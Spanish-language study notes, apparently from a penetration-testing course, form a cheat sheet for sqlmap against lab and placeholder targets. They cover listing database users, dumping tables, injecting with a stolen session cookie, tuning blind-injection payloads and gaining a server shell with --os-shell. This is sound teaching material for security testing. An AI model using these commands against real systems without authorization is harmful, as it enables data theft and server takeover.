Es ´preferible especificar la técnica que debemos usar para evitar que la aplicación muestre noisy information o que haga crash(Leer el SQL manual PDF para más detalles en /usr/share/sqlmap/doc/README.pdf

 No todas las inyecciones que muestra funcionan, tendríamos que probar una por una

Nota: Si queremos copiar un query generado por SQLMap en un URL, considerar usa

ar el URL encode para caracteres especiales.

Importante: Para que sqlmap trabaje en una sesión es necesario copiar el parámetro Cookie en la herramienta para mantener la sesión e inyectar logueados como un usuario (también se puede guardar desde burp suite el request completo y poner la ruta en sqlmap)

## Information Gathering

|   |   |
|---|---|
|>sqlmap -u [http://victim.com/view.php?id=123](http://victim.com/view.php?id?123) --users <otras_opciones>|Listar los usuarios de la DB|
|>sqlmap -u [http://victim.com/view.php?id=123](http://victim.com/view.php?id?123) --is-dba <otras_opciones>|Verificar si el user i<br><br>s a DB admin|
|>sqlmap -u [http://victim.com/view.php?id=123](http://victim.com/view.php?id?123) --dbs <otras_opciones>|Lista las DBs disponibles|
|>sqlmap -u [http://victim.com/view.php?id=123](http://victim.com/view.php?id?123) -b|Muestra el banner de la DB|
|>sqlmap -u ‘[http://victim.com/view.php?id=123](http://victim.com/view.php?id?123)’ -p id --technique=U -D DB name --tables <otras_opciones>|Enumera los tables de la DB conectada a la DB victima|
|> >sqlmap -u ‘[http://victim.com/view.php?id=123](http://victim.com/view.php?id?123)’ -p id --technique=U -D DB_name -T Nombre_tabla --columns <otras_opciones>|-T enumera la tabla especificada|
|>sqlmap -u ‘[http://victim.com/view.php?id=123](http://victim.com/view.php?id?123)’ -p id --technique=U -D DB_name -T Nombre_tabla -C col1,col2.col3  –dump <otras_opciones>|Muestra el contenido de las columnas especificadas de la tabla también especificada|

|   |   |
|---|---|
|>sqlmap --dbms=dbms_name|Especificamos manualmente el tipo de DBMS|

![The DBMSs you can specify are: 
• MySQL 
• Oracle 
. PostgreSQL 
• Microsoft SQL Server 
• Microsoft Access 
• SQLite 
• Firebird 
• Sybase 
• SAP MaxDB 
DB2](file:///C:/Users/fredd/AppData/Local/Temp/msohtmlclip1/02/clip_image001.png)

|                                                                                                                                                                                                                  |                                                                                                              |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------ |
| >sqlmap -u "[http://demo.ine.local/sqli_1.php?title=hello&action=search](http://demo.ine.local/sqli_1.php?title=hello&action=search)" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title | cookie de sesión extraído del proxy. Inyecta codigo en el payload title para ver si es vulnerable            |
| >sqlmap -u [http://victim.com/view.php?id=123](http://victim.com/view.php?id?123)                                                                                                                                | automáticamente escanea parámetros                                                                           |
| >sqlmap -u ‘[http://victim.com/view.php?id=123](http://victim.com/view.php?id?123)’ -p id --technique=U                                                                                                          | -p indica el parámetro que se va a explotar y technique el tipo de inyección, en este caso U de UNION based. |
| >sqlmap -u [http://victim.com/view.php?id=123](http://victim.com/view.php?id?123) --tables                                                                                                                       | muestra las tablas de la BQ después de la inyección automatizada                                             |
| >sqlmap -u [http://victim.com/view.php?id=123](http://victim.com/view.php?id?123) --current-db <nombre de tabla> --columns                                                                                       | Después de descubrir las tablas podemos las columnas que tiene                                               |
| >sqlmap -u [http://victim.com/view.php?id=123](http://victim.com/view.php?id?123) --current-db <nombre de tabla> --dump                                                                                          | extrae la información contenida en la tabla                                                                  |
| >sqlmap -u ‘[http://victim.com/view.php?id=123](http://victim.com/view.php?id?123)’ -p id --technique=U --users                                                                                                  | muestra los usuarios de a BD                                                                                 |
| >sqlmap -u ‘[http://victim.com/view.php?id=123](http://victim.com/view.php?id?123)’ -p id --technique=U --dbs                                                                                                    | qué DBs están conectados                                                                                     |
| >sqlmap -u [http://test.com/login.php](http://test.com/login.php)  --data=’user=a&pass=b’ -p user --technique=B --banner                                                                                         | -p usa de payload solo user, technique es Boolean para extraer el banner (versión de la DB)                  |
| >sqlmap -u [http://test.com/login.php](http://test.com/login.php)  --data=’user=a&pass=b’ -p user --technique=B --dbs                                                                                            | muestra las bases de datos conectadas a la nuestra                                                           |

Podemos guardar el HTTP method y parámetros desde burpsuite y usarlo en SQLMap

|   |   |
|---|---|
|>sqlmap -r /ruta/archivo_Burp.txt -p user --technique=B --banner|Mismo resultado|
|>sqlmap -r /ruta/archivo_Burp.txt -p user --technique=B --banner -v3 --flush-session|Hace una limpieza de buffer de la herramienta ya que guarda resultados previos y no los muestra más al hacer la misma consulta. -v3 es debugger|
|>sqlmap -r /root/archivo_burp.t -p title --os-shell|Nos brinda acceso a nivel de shell en la ruta donde está alojado el servidor web|

Los dato de resultado se guardan en un archivo /etc/share/sqlmao/output/sqlmap.test

## Tuneo de Payloads

Para maximizar la precisión de nuestros Blind SQLi, podemos tunear los comandos. 

--string cuando un string está siempre presente en true output pagers o

--not-string para los casos que un string sea siempre false en los output

>`sqlmap -u '[http://localhost/ecommerce.php?id=1](http://localhost/ecommerce.php?id=1)' --string "nokia" <other switches>`

A veces los POST están insertados en un formato como JSON o necesitamos insertar algunos caracteres para hacer el query sintacticamente correcto, podemos usar --prefix y --sufix

>`sqlmap -u '[http://localhost/ecommerce.php?id=1](http://localhost/ecommerce.php?id=1)' --suffix "'));" <other switches>`

### Agresividad de la carga

Por defecto Level 1 testea GET y POST parameters, incrementandolo a 2 testeamos Cookie headers. Al agregar más níveles testeremos otras cabeceras y se incrementará el número de columnas testeadas para in-band exploitation.

**Nota**: Colocando el -p switch hacemos un bypass del nivel. Este significa que manualmente colocaremos el parámetro para testear y lo haremos de una forma mas stealth

**Nota2:** Lanzar SQLMap con un high livel y --risk dejandolo de forma automática es nada profesional y posiblemente causará issues al lado del cliente.

![[Pasted image 20240316064830.png]]


Algunas inyecciones puede tomar tiempo, usamos --keep-alive para reducir el tiempo de espera del tool

`>sqlmap -u '[http://localhost/ecommerce.php?id=1](http://localhost/ecommerce.php?id=1) --keep-alive <otros_comando>`

`>sqlmap -u '[http://localhost/ecommerce.php?id=1](http://localhost/ecommerce.php?id=1) --technique=B --threads 7 <otros_comando>`   *Thread puede ser de 1 a 10*

### SQLMap using Bursuite


`$sqlmap -u "http://10.10.2.131/imfadministrator/cms.php?pagename=tutorials-incomplete"  -cookie "PHPSESSID=432rewr324" --dbs --dbms=mysql --batch --proxy http://127.0.0.1:8080
*batch uses all by default*